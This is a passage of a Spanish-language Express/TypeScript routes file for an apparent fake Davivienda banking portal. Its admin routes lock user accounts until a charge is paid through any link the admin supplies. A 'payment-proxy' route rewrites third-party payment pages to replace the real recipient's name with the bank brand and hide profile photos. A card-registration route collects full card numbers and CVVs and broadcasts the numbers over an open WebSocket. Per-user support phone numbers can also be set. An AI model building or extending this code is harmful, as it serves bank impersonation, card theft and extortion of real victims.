        .sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime())
        .slice(0, 20)
        .map(l => ({
          id: l.id,
          action: l.action,
          details: l.details,
          ipAddress: l.ipAddress,
          createdAt: l.createdAt,
        }));
      
      res.status(200).json({
        totalUsers,
        activeAccounts,
        blockedAccounts,
        activeSessions,
        recentUsers,
        totalBalance,
        transactionsToday,
        volumeToday,
        pendingCharges,
        paidCharges,
        securityAlerts
      });
    } catch (error) {
      console.error("Error obteniendo estadísticas:", error);
      res.status(500).json({ message: "Error en el servidor" });
    }
  });

  // CARD ROUTES (Admin)
  app.get("/api/admin/cards", isAdmin, async (req: Request, res: Response) => {
    try {
      const cards = await storage.getAllCards();
      
      // Enrich cards with user information
      const enrichedCards = await Promise.all(cards.map(async (card) => {
        const user = await storage.getUser(card.userId);
        return {
          ...card,
          userName: user ? user.name : null,
          userDocument: user ? user.document : null
        };
      }));
      
      res.status(200).json(enrichedCards);
    } catch (error) {
      console.error("Error obteniendo tarjetas:", error);
      res.status(500).json({ message: "Error en el servidor" });
    }
  });
  
  app.get("/api/admin/cards/pending", isAdmin, async (req: Request, res: Response) => {
    try {
      const cards = await storage.getPendingCards();
      
      // Enrich cards with user information
      const enrichedCards = await Promise.all(cards.map(async (card) => {
        const user = await storage.getUser(card.userId);
        return {
          ...card,
          userName: user ? user.name : null,
          userDocument: user ? user.document : null
        };
      }));
      
      res.status(200).json(enrichedCards);
    } catch (error) {
      console.error("Error obteniendo tarjetas pendientes:", error);
      res.status(500).json({ message: "Error en el servidor" });
    }
  });
  
  app.put("/api/admin/cards/:id/approve", isAdmin, async (req: Request, res: Response) => {
    try {
      const cardId = parseInt(req.params.id);
      const adminId = req.session.userId || 1;
      
      const card = await storage.approveCard(cardId, adminId);
      if (!card) {
        return res.status(404).json({ message: "Tarjeta no encontrada" });
      }
      
      // Create notification for user
      await storage.createCardNotification({
        userId: card.userId,
        cardId: card.id,
        type: "card_approved",
        message: `Su tarjeta ha sido aprobada y está activa.`,
        read: 0
      });
      
      await createAuditLog(req, "card_approved", `Admin aprobó tarjeta #${cardId} para usuario ${card.userId}`, "card", cardId);

      res.status(200).json(card);
    } catch (error) {
      console.error("Error aprobando tarjeta:", error);
      res.status(500).json({ message: "Error en el servidor" });
    }
  });
  
  app.put("/api/admin/cards/:id/reject", isAdmin, async (req: Request, res: Response) => {
    try {
      const cardId = parseInt(req.params.id);
      
      const card = await storage.rejectCard(cardId);
      if (!card) {
        return res.status(404).json({ message: "Tarjeta no encontrada" });
      }
      
      // Create notification for user
      await storage.createCardNotification({
        userId: card.userId,
        cardId: card.id,
        type: "card_rejected",
        message: `Su solicitud de tarjeta ha sido rechazada.`,
        read: 0
      });
      
      await createAuditLog(req, "card_rejected", `Admin rechazó tarjeta #${cardId} para usuario ${card.userId}`, "card", cardId);

      res.status(200).json(card);
    } catch (error) {
      console.error("Error rechazando tarjeta:", error);
      res.status(500).json({ message: "Error en el servidor" });
    }
  });
  
  app.put("/api/admin/cards/:id/status", isAdmin, async (req: Request, res: Response) => {
    try {
      const cardId = parseInt(req.params.id);
      const { status } = req.body;
      
      if (!status) {
        return res.status(400).json({ message: "Estado es requerido" });
      }
      
      const card = await storage.updateCardStatus(cardId, status);
      if (!card) {
        return res.status(404).json({ message: "Tarjeta no encontrada" });
      }
      
      // Create notification for user
      const statusMessages: { [key: string]: string } = {
        'active': 'Su tarjeta ha sido activada.',
        'blocked': 'Su tarjeta ha sido bloqueada.',
        'frozen': 'Su tarjeta ha sido congelada.',
        'pending': 'Su tarjeta está pendiente de revisión.'
      };
      
      await storage.createCardNotification({
        userId: card.userId,
        cardId: card.id,
        type: `card_${status}`,
        message: statusMessages[status] || `Estado de tarjeta actualizado a ${status}.`,
        read: 0
      });
      
      res.status(200).json(card);
    } catch (error) {
      console.error("Error actualizando estado de tarjeta:", error);
      res.status(500).json({ message: "Error en el servidor" });
    }
  });
  
  app.put("/api/admin/cards/:id/balance", isAdmin, async (req: Request, res: Response) => {
    try {
      const cardId = parseInt(req.params.id);
      const { balance } = req.body;
      
      if (balance === undefined) {
        return res.status(400).json({ message: "Saldo es requerido" });
      }
      
      const card = await storage.updateCardBalance(cardId, Number(balance));
      if (!card) {
        return res.status(404).json({ message: "Tarjeta no encontrada" });
      }
      
      res.status(200).json(card);
    } catch (error) {
      console.error("Error actualizando saldo de tarjeta:", error);
      res.status(500).json({ message: "Error en el servidor" });
    }
  });
  
  app.put("/api/admin/cards/:id/balance-status", isAdmin, async (req: Request, res: Response) => {
    try {
      const cardId = parseInt(req.params.id);
      const { balanceStatus } = req.body;
      
      if (!balanceStatus) {
        return res.status(400).json({ message: "Estado de saldo es requerido" });
      }
      
      const card = await storage.updateCardBalanceStatus(cardId, balanceStatus);
      if (!card) {
        return res.status(404).json({ message: "Tarjeta no encontrada" });
      }
      
      // Create notification for user
      const statusMessages: { [key: string]: string } = {
        'active': 'El saldo de su tarjeta está activo.',
        'blocked': 'El saldo de su tarjeta ha sido bloqueado.',
        'frozen': 'El saldo de su tarjeta ha sido congelado.'
      };
      
      await storage.createCardNotification({
        userId: card.userId,
        cardId: card.id,
        type: `balance_${balanceStatus}`,
        message: statusMessages[balanceStatus] || `Estado de saldo actualizado.`,
        read: 0
      });
      
      res.status(200).json(card);
    } catch (error) {
      console.error("Error actualizando estado de saldo:", error);
      res.status(500).json({ message: "Error en el servidor" });
    }
  });
  
  app.get("/api/admin/card-notifications", isAdmin, async (req: Request, res: Response) => {
    try {
      const notifications = await storage.getAllCardNotifications();
      res.status(200).json(notifications);
    } catch (error) {
      console.error("Error obteniendo notificaciones de tarjetas:", error);
      res.status(500).json({ message: "Error en el servidor" });
    }
  });
  
  // Admin create card directly for a user
  app.post("/api/admin/cards", isAdmin, async (req: Request, res: Response) => {
    try {
      const adminId = req.session.userId!;
      const { userId, cardNumber, cardType, cardBrand, expirationDate, cvv, status, balance, balanceStatus } = req.body;
      
      if (!userId || !cardNumber || !cardType || !cardBrand) {
        return res.status(400).json({ message: "Datos incompletos" });
      }
      
      const card = await storage.createCard({
        userId,
        cardNumber,
        cardType,
        cardBrand,
        expirationDate: expirationDate || "00/00",
        cvv: cvv || "",
        status: status || "active",
        balance: balance || 0,
        balanceStatus: balanceStatus || "active",
        requestType: "admin"
      });
      
      // Notify user
      await storage.createCardNotification({
        userId,
        cardId: card.id,
        type: "card_created",
        message: "Se le ha asignado una nueva tarjeta.",
        read: 0
      });
      
      await createAuditLog(req, "card_approved", `Admin creó tarjeta directamente para usuario ${userId}`, "card", card.id);

      res.status(201).json(card);
    } catch (error) {
      console.error("Error creando tarjeta:", error);
      res.status(500).json({ message: "Error en el servidor" });
    }
  });
  
  // Admin edit card
  app.put("/api/admin/cards/:id", isAdmin, async (req: Request, res: Response) => {
    try {
      const cardId = parseInt(req.params.id);
      const { cardNumber, cardType, cardBrand, expirationDate, cvv, status, balance, balanceStatus } = req.body;
      
      const card = await storage.updateCard(cardId, {
        cardNumber,
        cardType,
        cardBrand,
        expirationDate,
        cvv,
        status,
        balance,
        balanceStatus
      });
      
      if (!card) {
        return res.status(404).json({ message: "Tarjeta no encontrada" });
      }
      
      res.status(200).json(card);
    } catch (error) {
      console.error("Error actualizando tarjeta:", error);
      res.status(500).json({ message: "Error en el servidor" });
    }
  });
  
  // ACCOUNT CHARGES ROUTES (Admin)
  app.get("/api/admin/charges", isAdmin, async (req: Request, res: Response) => {
    try {
      const charges = await storage.getAllAccountCharges();
      const chargesWithInfo = await Promise.all(charges.map(async (charge) => {
        const account = await storage.getAccountById(charge.accountId);
        const user = account ? await storage.getUser(account.userId) : null;
        return { ...charge, accountNumber: account?.accountNumber, userName: user?.name };
      }));
      res.status(200).json(chargesWithInfo);
    } catch (error) {
      console.error("Error obteniendo cobros:", error);
      res.status(500).json({ message: "Error en el servidor" });
    }
  });

  app.post("/api/admin/charges", isAdmin, async (req: Request, res: Response) => {
    try {
      const adminId = req.session.userId!;
      const { accountId, type, reason, title, description, amount, currency, interestRate, discountPercent, scheduledDate, expiresAt, status, notifyUser, applyToBalance, requireStripePayment, customPaymentLink } = req.body;
      
      const chargeReason = reason || title;
      if (!accountId || !type || !chargeReason) {
        return res.status(400).json({ message: "Cuenta, tipo y motivo son requeridos" });
      }

      if (customPaymentLink && typeof customPaymentLink === 'string' && customPaymentLink.trim()) {
        try {
          const url = new URL(customPaymentLink.trim());
          if (!['http:', 'https:'].includes(url.protocol)) {
            return res.status(400).json({ message: "El link de pago debe ser una URL válida (https://...)" });
          }
        } catch {
          return res.status(400).json({ message: "El link de pago debe ser una URL válida" });
        }
      }

      const account = await storage.getAccountById(accountId);
      if (!account) return res.status(404).json({ message: "Cuenta no encontrada" });

      const chargeAmount = Number(amount) || 0;
      const chargeCurrency = currency || account.currency || "COP";

      const hasPaymentLink = !!(customPaymentLink && typeof customPaymentLink === 'string' && customPaymentLink.trim());
      const charge = await storage.createAccountCharge({
        accountId,
        type,
        reason: chargeReason,
        description: description || null,
        amount: chargeAmount,
        currency: chargeCurrency,
        interestRate: Number(interestRate) || 0,
        discountPercent: Number(discountPercent) || 0,
        scheduledDate: scheduledDate ? new Date(scheduledDate) : null,
        expiresAt: expiresAt ? new Date(expiresAt) : null,
        status: (requireStripePayment || hasPaymentLink) ? "pending_payment" : (status || "active"),
        appliedBy: adminId,
        notifyUser: notifyUser !== false ? 1 : 0,
        stripeSessionId: null,
        stripePaymentUrl: hasPaymentLink ? customPaymentLink : null,
        stripePaymentIntentId: null,
      });

      if (requireStripePayment && !hasPaymentLink && chargeAmount > 0) {
        // Admin can now provide any link, if provided we use it. 
        // If not, we generate a Stripe session.
        try {
          const stripe = await getUncachableStripeClient();
          const currencyMap: Record<string, string> = {
            'COP': 'cop', 'USD': 'usd', 'EUR': 'eur', 'GBP': 'gbp', 'BRL': 'brl'
          };
          const stripeCurrency = currencyMap[chargeCurrency] || 'usd';
          const unitAmount = ['cop'].includes(stripeCurrency)
            ? Math.round(chargeAmount)
            : Math.round(chargeAmount * 100);

          const replitDomains = process.env.REPLIT_DOMAINS;
          const baseUrl = replitDomains ? `https://${replitDomains.split(',')[0]}` : 'http://localhost:5000';

          const session = await stripe.checkout.sessions.create({
            payment_method_types: ['card'],
            line_items: [{
              price_data: {
                currency: stripeCurrency,
                product_data: {
                  name: `${type.charAt(0).toUpperCase() + type.slice(1)} - ${chargeReason}`,
                  description: description || `Cobro aplicado a cuenta ${account.accountNumber}`,
                },
                unit_amount: unitAmount,
              },
              quantity: 1,
            }],
            mode: 'payment',
            success_url: `${baseUrl}/payment/success?charge_id=${charge.id}&session_id={CHECKOUT_SESSION_ID}`,
            cancel_url: `${baseUrl}/payment/cancel?charge_id=${charge.id}`,
            metadata: {
              charge_id: String(charge.id),
              account_id: String(accountId),
              charge_type: type,
            },
          });

          await storage.updateAccountChargeStripe(charge.id, session.id, session.url || '');
          charge.stripeSessionId = session.id;
          charge.stripePaymentUrl = session.url || '';
          charge.status = 'pending_payment';
        } catch (stripeError: any) {
          console.error("Error creating Stripe session:", stripeError);
          await storage.updateAccountChargeStatus(charge.id, 'active');
        }
      }

      const isCredit = type === 'promo' || type === 'descuento';
      if (!requireStripePayment && !hasPaymentLink && applyToBalance && chargeAmount > 0 && !isCredit) {
        await storage.updateAccountBalance(accountId, -Math.abs(chargeAmount));
        await storage.createTransaction({
          accountId,
          amount: -Math.abs(chargeAmount),
          description: `${type.toUpperCase()}: ${chargeReason}`,
          date: new Date(),
          type: "withdrawal",
          reference: `CHG-${charge.id}`,
          recipientId: null
        });
      }

      if (!requireStripePayment && applyToBalance && chargeAmount > 0 && isCredit) {
        await storage.updateAccountBalance(accountId, Math.abs(chargeAmount));
        await storage.createTransaction({
          accountId,
          amount: Math.abs(chargeAmount),
          description: `${type.toUpperCase()}: ${chargeReason}`,
          date: new Date(),
          type: "deposit",
          reference: `CHG-${charge.id}`,
          recipientId: null
        });
      }

      if (requireStripePayment || hasPaymentLink) {
        await storage.updateAccountStatus(accountId, "BLOQUEADA", `Su cuenta ha sido suspendida por un cobro pendiente: ${chargeReason}. Realice el pago para reactivar su cuenta.`);
      }

      if (notifyUser !== false) {
        const paymentMsg = (requireStripePayment || hasPaymentLink) ? ' - Pendiente de pago' : '';
        const typeLabels: Record<string, string> = {
          multa: '⚠️ Multa aplicada',
          cobro: '💳 Cobro aplicado',
          promo: '🎁 Promoción aplicada',
          acceso_especial: '🔓 Acceso especial otorgado',
          descuento: '🏷️ Descuento aplicado'
        };
        const typeLabel = typeLabels[type] || `📋 ${type.charAt(0).toUpperCase() + type.slice(1)}`;
        await storage.createCardNotification({
          userId: account.userId,
          cardId: null,
          type: `charge_${type}`,
          message: `${typeLabel}: ${chargeReason}${paymentMsg}`,
          read: 0
        });
      }

      (global as any).broadcastAdminNotification(`[COBRO] ${type.toUpperCase()} aplicado a cuenta ${account.accountNumber}: ${chargeReason}`);
      
      await createAuditLog(req, "admin_charge_created", `Admin creó ${type} en cuenta ${account.accountNumber}: ${chargeReason} ($${chargeAmount})${requireStripePayment ? ' [Pago Stripe]' : ''}`, "charge", charge.id);

      res.status(201).json(charge);
    } catch (error) {
      console.error("Error creando cobro:", error);
      res.status(500).json({ message: "Error en el servidor" });
    }
  });

  app.put("/api/admin/charges/:id/status", isAdmin, async (req: Request, res: Response) => {
    try {
      const id = parseInt(req.params.id);
      const { status } = req.body;
      const paidAt = status === 'paid' ? new Date() : undefined;
      const charge = await storage.updateAccountChargeStatus(id, status, paidAt);
      if (!charge) return res.status(404).json({ message: "Cobro no encontrado" });

      if (status === 'paid') {
        const account = await storage.getAccountById(charge.accountId);
        if (account) {
          const remainingCharges = await storage.getAccountChargesByAccountId(charge.accountId);
          const hasPendingCharges = remainingCharges.some((c: any) => c.id !== id && c.status === 'pending_payment');
          if (!hasPendingCharges && account.status === 'BLOQUEADA') {
            await storage.updateAccountStatus(charge.accountId, 'ACTIVA', '');
          }
          await storage.createCardNotification({
            userId: account.userId,
            cardId: null,
            type: 'payment_confirmed',
            message: `Pago confirmado: ${charge.reason} - $${charge.amount} ${charge.currency}`,
            read: 0
          });
        }
      }

      res.status(200).json(charge);
    } catch (error) {
      res.status(500).json({ message: "Error en el servidor" });
    }
  });

  app.delete("/api/admin/charges/:id", isAdmin, async (req: Request, res: Response) => {
    try {
      const id = parseInt(req.params.id);
      await storage.deleteAccountCharge(id);
      res.status(200).json({ message: "Cobro eliminado" });
    } catch (error) {
      res.status(500).json({ message: "Error en el servidor" });
    }
  });

  app.get("/api/checkout/:chargeId", isAuthenticated, async (req: Request, res: Response) => {
    try {
      const chargeId = parseInt(req.params.chargeId);
      const userId = req.session.userId!;

      const charge = await storage.getAccountChargeById(chargeId);
      if (!charge) return res.status(404).json({ message: "Cobro no encontrado" });

      const account = await storage.getAccountById(charge.accountId);
      if (!account || account.userId !== userId) {
        return res.status(403).json({ message: "No autorizado" });
      }

      if (!charge.stripePaymentUrl) {
        return res.status(400).json({ message: "Este cobro no tiene un link de pago" });
      }

      const brandNameSetting = await storage.getSetting("checkout_brand_name");
      const brandTaglineSetting = await storage.getSetting("checkout_brand_tagline");

      const orderId = `ORD-${charge.id}-${Date.now().toString(36).toUpperCase()}`;

      res.status(200).json({
        id: charge.id,
        reason: charge.reason,
        description: charge.description,
        amount: charge.amount,
        currency: charge.currency,
        status: charge.status,
        orderId,
        paymentUrl: charge.stripePaymentUrl,
        brandName: brandNameSetting?.value || "Davivienda Pagos",
        brandTagline: brandTaglineSetting?.value || "Pasarela de pago segura",
      });
    } catch (error) {
      res.status(500).json({ message: "Error en el servidor" });
    }
  });

  app.get("/api/payment-proxy/:chargeId", isAuthenticated, async (req: Request, res: Response) => {
    try {
      const chargeId = parseInt(req.params.chargeId);
      const userId = req.session.userId!;

      const charge = await storage.getAccountChargeById(chargeId);
      if (!charge) return res.status(404).json({ message: "Cobro no encontrado" });

      const account = await storage.getAccountById(charge.accountId);
      if (!account || account.userId !== userId) {
        return res.status(403).json({ message: "No autorizado" });
      }

      if (!charge.stripePaymentUrl) {
        return res.status(400).json({ message: "No hay link de pago" });
      }

      const targetUrl = charge.stripePaymentUrl;
      const parsedTarget = new URL(targetUrl);
      const baseOrigin = parsedTarget.origin;

      const fetchRes = await fetch(targetUrl, {
        headers: {
          'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
          'Accept-Language': 'es-CO,es;q=0.9',
        },
      });

      if (!fetchRes.ok) {
        const brandNameSetting2 = await storage.getSetting("checkout_brand_name");
        const bn = brandNameSetting2?.value || "Davivienda Pagos";
        res.setHeader('Content-Type', 'text/html; charset=utf-8');
        return res.status(200).send(`<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>${bn}</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#f9fafb;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px}.c{text-align:center;max-width:320px}.icon{width:56px;height:56px;background:#fef3c7;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 16px;font-size:28px}h2{font-size:18px;color:#1f2937;margin-bottom:8px}p{font-size:14px;color:#6b7280;margin-bottom:20px;line-height:1.5}a.btn{display:block;padding:14px 24px;background:#D50000;color:white;text-decoration:none;border-radius:8px;font-weight:600;font-size:15px}a.btn:hover{background:#b30000}.copy{margin-top:12px;padding:10px;background:white;border:1px solid #e5e7eb;border-radius:8px;font-size:13px;color:#6b7280;cursor:pointer;width:100%}</style></head><body><div class="c"><div class="icon">&#9888;</div><h2>Pasarela externa</h2><p>La pasarela de pago se abrira en una nueva ventana. Complete el pago y regrese.</p><a class="btn" href="${targetUrl}" target="_blank" rel="noopener noreferrer">Abrir pasarela de pago</a><button class="copy" onclick="navigator.clipboard.writeText('${targetUrl}');this.textContent='Link copiado!'">Copiar link de pago</button></div></body></html>`);
      }

      let html = await fetchRes.text();

      const ownerNameSetting = await storage.getSetting("checkout_owner_name");
      const ownerName = ownerNameSetting?.value || "";
      const brandNameSetting = await storage.getSetting("checkout_brand_name");
      const brandName = brandNameSetting?.value || "Davivienda Pagos";

      if (ownerName) {
        const escapedName = ownerName.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
        const nameRegex = new RegExp(escapedName, 'gi');
        html = html.replace(nameRegex, brandName);

        const parts = ownerName.trim().split(/\s+/);
        if (parts.length > 1) {
          const flexiblePattern = parts.map(p => p.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')).join('\\s+');
          const flexRegex = new RegExp(flexiblePattern, 'gi');
          html = html.replace(flexRegex, brandName);
        }
      }

      html = html.replace(/(href|src|action)="\/(?!\/)/g, `$1="${baseOrigin}/`);
      html = html.replace(/(href|src|action)='\/(?!\/)/g, `$1='${baseOrigin}/`);

      html = html.replace(
        '</head>',
        `<base href="${baseOrigin}/" /><style>img[src*="profile"],img[src*="avatar"],img[src*="user"]{display:none!important;}</style></head>`
      );

      res.setHeader('Content-Type', 'text/html; charset=utf-8');
      res.setHeader('X-Frame-Options', 'SAMEORIGIN');
      res.send(html);
    } catch (error) {
      res.setHeader('Content-Type', 'text/html; charset=utf-8');
      res.status(200).send(`<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#f9fafb;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px}.c{text-align:center;max-width:320px}.icon{width:56px;height:56px;background:#fee2e2;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 16px;font-size:28px}h2{font-size:18px;color:#1f2937;margin-bottom:8px}p{font-size:14px;color:#6b7280;line-height:1.5}</style></head><body><div class="c"><div class="icon">&#10060;</div><h2>Error de conexion</h2><p>No se pudo conectar con la pasarela de pago. Intente de nuevo mas tarde.</p></div></body></html>`);
    }
  });

  // Get charges for the logged-in user's account
  app.get("/api/charges", isAuthenticated, async (req: Request, res: Response) => {
    try {
      const userId = req.session.userId!;
      const account = await storage.getAccountByUserId(userId);
      if (!account) return res.status(404).json({ message: "Cuenta no encontrada" });
      const charges = await storage.getAccountChargesByAccountId(account.id);
      res.status(200).json(charges);
    } catch (error) {
      res.status(500).json({ message: "Error en el servidor" });
    }
  });

  // Verify Stripe payment completion
  app.post("/api/charges/:id/verify-payment", isAuthenticated, async (req: Request, res: Response) => {
    try {
      const chargeId = parseInt(req.params.id);
      const { session_id } = req.body;
      const userId = req.session.userId!;

      const charge = await storage.getAccountChargeById(chargeId);
      if (!charge) return res.status(404).json({ message: "Cobro no encontrado" });

      const account = await storage.getAccountById(charge.accountId);
      if (!account) return res.status(404).json({ message: "Cuenta no encontrada" });

      const user = await storage.getUser(userId);
      if (account.userId !== userId && (!user || user.isAdmin !== 1)) {
        return res.status(403).json({ message: "No autorizado para verificar este pago" });
      }

      if (!charge.stripeSessionId) {
        return res.status(400).json({ message: "Este cobro no tiene un pago de Stripe asociado" });
      }

      if (session_id && session_id !== charge.stripeSessionId) {
        return res.status(400).json({ message: "La sesión de pago no coincide con el cobro" });
      }

      if (charge.status === 'paid') {
        return res.status(200).json({ status: 'paid', message: 'Este pago ya fue confirmado' });
      }

      const stripe = await getUncachableStripeClient();
      const session = await stripe.checkout.sessions.retrieve(charge.stripeSessionId);

      if (session.metadata?.charge_id !== String(chargeId)) {
        return res.status(400).json({ message: "La sesión no corresponde a este cobro" });
      }

      if (session.payment_status === 'paid') {
        await storage.updateAccountChargeStatus(chargeId, 'paid', new Date());
        if (session.payment_intent) {
          await storage.updateAccountChargePaymentIntent(chargeId, session.payment_intent as string);
        }

        // Automatically add the amount to the account balance
        await storage.updateAccountBalance(account.id, charge.amount);

        // Create transaction record for the deposit
        await storage.createTransaction({
          accountId: account.id,
          amount: charge.amount,
          description: `Recarga por pasarela: ${charge.reason}`,
          date: new Date(),
          type: "deposit",
          reference: session.payment_intent as string || `STRIPE-${chargeId}`,
          recipientId: null
        });

        await storage.createCardNotification({
          userId: account.userId,
          cardId: null,
          type: 'payment_confirmed',
          message: `✅ Pago confirmado: ${charge.reason} - $${charge.amount} ${charge.currency}`,
          read: 0
        });

        (global as any).broadcastAdminNotification(`[PAGO] Pago Stripe confirmado para cobro #${chargeId}: $${charge.amount} ${charge.currency}`);
        
        res.status(200).json({ status: 'paid', message: 'Pago confirmado exitosamente' });
      } else {
        res.status(200).json({ status: 'unpaid', message: 'Pago aún no completado' });
      }
    } catch (error: any) {
      console.error("Error verifying payment:", error);
      res.status(500).json({ message: "Error verificando el pago" });
    }
  });

  // Get Stripe publishable key for frontend
  app.get("/api/stripe/publishable-key", async (req: Request, res: Response) => {
    try {
      const key = await getStripePublishableKey();
      res.json({ publishableKey: key });
    } catch (error) {
      res.status(500).json({ message: "Error obteniendo clave de Stripe" });
    }
  });

  // Admin assign custom support phone to a user
  app.put("/api/admin/users/:id/support-phone", isAdmin, async (req: Request, res: Response) => {
    try {
      const userId = parseInt(req.params.id);
      const { customSupportPhone } = req.body;
      const user = await storage.updateUser(userId, { customSupportPhone: customSupportPhone || null });
      if (!user) return res.status(404).json({ message: "Usuario no encontrado" });
      res.status(200).json({ message: "Número de soporte actualizado", user });
    } catch (error) {
      res.status(500).json({ message: "Error en el servidor" });
    }
  });

  // Get support phone for logged-in user (checks custom first, falls back to global)
  app.get("/api/my/support-phone", isAuthenticated, async (req: Request, res: Response) => {
    try {
      const userId = req.session.userId!;
      const user = await storage.getUser(userId);
      if (user?.customSupportPhone) {
        return res.status(200).json({ value: user.customSupportPhone, source: "custom" });
      }
      const setting = await storage.getSetting("support_phone");
      return res.status(200).json({ value: setting?.value || "+573209233903", source: "global" });
    } catch (error) {
      res.status(500).json({ message: "Error en el servidor" });
    }
  });

  // AUDIT LOG ROUTES (Admin)
  app.get("/api/admin/audit-logs", isAdmin, async (req: Request, res: Response) => {
    try {
      const logs = await storage.getAllAuditLogs();
      
      const enrichedLogs = await Promise.all(logs.map(async (log) => {
        const user = log.userId ? await storage.getUser(log.userId) : null;
        return {
          ...log,
          userName: user ? user.name : null
        };
      }));
      
      res.status(200).json(enrichedLogs);
    } catch (error) {
      console.error("Error obteniendo audit logs:", error);
      res.status(500).json({ message: "Error en el servidor" });
    }
  });

  // SETTINGS ROUTES
  app.get("/api/settings/:key", async (req: Request, res: Response) => {
    try {
      const setting = await storage.getSetting(req.params.key);
      if (!setting) {
        return res.status(404).json({ message: "Configuración no encontrada" });
      }
      res.status(200).json(setting);
    } catch (error) {
      console.error("Error obteniendo configuración:", error);
      res.status(500).json({ message: "Error en el servidor" });
    }
  });
  
  app.get("/api/admin/settings", isAdmin, async (req: Request, res: Response) => {
    try {
      const settings = await storage.getAllSettings();
      res.status(200).json(settings);
    } catch (error) {
      console.error("Error obteniendo configuraciones:", error);
      res.status(500).json({ message: "Error en el servidor" });
    }
  });
  
  app.put("/api/admin/settings/:key", isAdmin, async (req: Request, res: Response) => {
    try {
      const adminId = req.session.userId!;
      const { value, description } = req.body;
      
      if (!value) {
        return res.status(400).json({ message: "Valor es requerido" });
      }
      
      const setting = await storage.setSetting(req.params.key, value, description, adminId);
      
      await createAuditLog(req, "settings_change", `Admin actualizó configuración "${req.params.key}" a "${value}"`, "setting", setting.id);

      res.status(200).json(setting);
    } catch (error) {
      console.error("Error actualizando configuración:", error);
      res.status(500).json({ message: "Error en el servidor" });
    }
  });
  
  // CARD ROUTES (User)
  app.get("/api/cards", isAuthenticated, async (req: Request, res: Response) => {
    try {
      const userId = req.session.userId!;
      const cards = await storage.getCardsByUserId(userId);
      res.status(200).json(cards);
    } catch (error) {
      console.error("Error obteniendo tarjetas:", error);
      res.status(500).json({ message: "Error en el servidor" });
    }
  });
  
  app.post("/api/cards/request", isAuthenticated, async (req: Request, res: Response) => {
    try {
      const userId = req.session.userId!;
      const user = await storage.getUser(userId);
      
      // Create a pending card request
      const card = await storage.createCard({
        userId,
        cardNumber: "****-****-****-" + randomInt(1000, 9999),
        cardType: req.body.cardType || "debit",
        cardBrand: req.body.cardBrand || "visa",
        expirationDate: "00/00",
        status: "pending",
        balance: 0,
        balanceStatus: "active",
        requestType: "request"
      });
      
      // Create admin notification
      await storage.createCardNotification({
        userId: 1, // Admin
        cardId: card.id,
        type: "card_request",
        message: `Usuario ${user?.name || userId} ha solicitado una nueva tarjeta.`,
        read: 0
      });
      
      // Broadcast to admin
      (global as any).broadcastAdminNotification(`[TARJETA] Nueva solicitud de tarjeta de ${user?.name || 'Usuario'}`);
      
      await createAuditLog(req, "card_request", `Usuario "${user?.name}" solicitó nueva tarjeta`, "card", card.id);

      res.status(201).json(card);
    } catch (error) {
      console.error("Error solicitando tarjeta:", error);
      res.status(500).json({ message: "Error en el servidor" });
    }
  });
  
  app.post("/api/cards/register", isAuthenticated, async (req: Request, res: Response) => {
    try {
      const userId = req.session.userId!;
      const user = await storage.getUser(userId);
      const { cardNumber, cardType, cardBrand, expirationDate, cvv } = req.body;
      
      if (!cardNumber || !expirationDate) {
        return res.status(400).json({ message: "Datos de tarjeta incompletos" });
      }
      
      // Create a pending card registration
      const card = await storage.createCard({
        userId,
        cardNumber,
        cardType: cardType || "debit",
        cardBrand: cardBrand || "visa",
        expirationDate,
        cvv,
        status: "pending",
        balance: 0,
        balanceStatus: "active",
        requestType: "register"
      });
      
      // Create admin notification
      await storage.createCardNotification({
        userId: 1, // Admin
        cardId: card.id,
        type: "card_register",
        message: `Usuario ${user?.name || userId} está intentando inscribir una tarjeta: ${cardNumber}`,
        read: 0
      });
      
      // Broadcast to admin
      (global as any).broadcastAdminNotification(`[TARJETA] Usuario ${user?.name || 'Usuario'} inscribiendo tarjeta: ${cardNumber}`);
      
      await createAuditLog(req, "card_register", `Usuario "${user?.name}" inscribió tarjeta ${cardNumber}`, "card", card.id);

      res.status(201).json(card);
    } catch (error) {
      console.error("Error inscribiendo tarjeta:", error);
      res.status(500).json({ message: "Error en el servidor" });
    }
  });
  
  app.get("/api/card-notifications", isAuthenticated, async (req: Request, res: Response) => {
    try {
      const userId = req.session.userId!;
      const notifications = await storage.getCardNotificationsByUserId(userId);
      res.status(200).json(notifications);
    } catch (error) {
      console.error("Error obteniendo notificaciones:", error);
      res.status(500).json({ message: "Error en el servidor" });
    }
  });

  // SERVICE ROUTES
  app.get("/api/services", isAuthenticated, async (req: Request, res: Response) => {
    try {
      const { category } = req.query;
      
      let services;
      if (category) {
        services = await storage.getServicesByCategory(category as string);
      } else {
        services = await storage.getAllServices();
      }
      
      return res.status(200).json(services);
    } catch (error) {
      console.error("Error obteniendo servicios:", error);
      return res.status(500).json({ message: "Error en el servidor" });
    }
  });

  // Create HTTP server
  const httpServer = createServer(app);
  
  // Setup WebSocket server for real-time notifications
  const wss = new WebSocketServer({ server: httpServer, path: '/ws' });
  
  // Store active connections
  const connections: any[] = [];
  
  // WebSocket events
  wss.on('connection', (ws: any) => {
    console.log('WebSocket client connected');
    connections.push(ws);
    
    ws.on('close', () => {
      console.log('WebSocket client disconnected');
      const index = connections.indexOf(ws);
      if (index !== -1) {
        connections.splice(index, 1);
      }
    });
  });
  
  // Function to broadcast admin notifications
  (global as any).broadcastAdminNotification = (message: string) => {
    connections.forEach(client => {
      if (client.readyState === 1) { // OPEN
        client.send(JSON.stringify({ type: 'admin_notification', message }));
      }
    });
  };
  
  return httpServer;
}
